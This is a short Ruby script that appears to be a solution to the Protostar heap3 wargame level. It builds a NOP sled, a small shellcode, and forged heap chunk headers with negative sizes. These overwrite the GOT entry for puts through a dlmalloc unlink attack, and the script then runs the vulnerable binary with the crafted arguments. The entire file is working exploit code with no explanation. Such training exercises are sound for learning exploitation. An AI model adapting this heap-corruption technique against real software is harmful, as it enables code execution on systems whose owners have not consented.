#!/usr/bin/ruby

nop = '\x90' * 12
shellcode = '\x68\x64\x88\x04\x08\xc3'
fillerbytes = "A" * 14
chunk_B_prev_size = '\xf8\xff\xff\xff'
chunk_B_size = '\xfc\xff\xff\xff'

bufA = nop + shellcode + fillerbytes + chunk_B_prev_size + chunk_B_size

deadbeef = '\xff\xbe\xad\xde' * 2
addr_puts_minus_12 = '\x1c\xb1\x04\x08'
addr_nop = '\x08\xc0\x04\x08'

bufB = deadbeef + addr_puts_minus_12 + addr_nop

bufC = "ABCD"

command = <<-END
/opt/protostar/bin/heap3 `ruby -e 'puts "#{bufA}"'` `ruby -e 'puts "#{bufB}"'` #{bufC}
END

#puts command
puts `#{command}`

